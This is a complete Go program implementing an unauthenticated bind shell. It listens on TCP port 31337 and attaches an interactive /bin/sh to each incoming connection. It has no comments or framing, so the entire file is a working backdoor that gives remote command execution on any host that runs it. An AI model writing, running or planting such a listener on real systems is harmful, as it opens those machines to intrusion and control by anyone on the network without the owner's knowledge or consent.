package main

import (
	"os/exec"

	"io"
	"log"
	"net"
)

func handle(conn net.Conn) {
	defer conn.Close()

	cmd := exec.Command("/bin/sh", "-i")

	rp, wp := io.Pipe()

	cmd.Stdin = conn
	cmd.Stdout = wp

	go io.Copy(conn, rp)

	if err := cmd.Run(); err != nil {
		log.Println("Failed to run command")
	}

}

func main() {

	listener, err := net.Listen("tcp", ":31337")
	if err != nil {
		log.Fatalln("Unable to bind port")

	} else {

		for {
			conn, err := listener.Accept()

			if err != nil {
				log.Println("Failed to accept connection")
			} else {
				go handle(conn)

			}
		}
	}
}
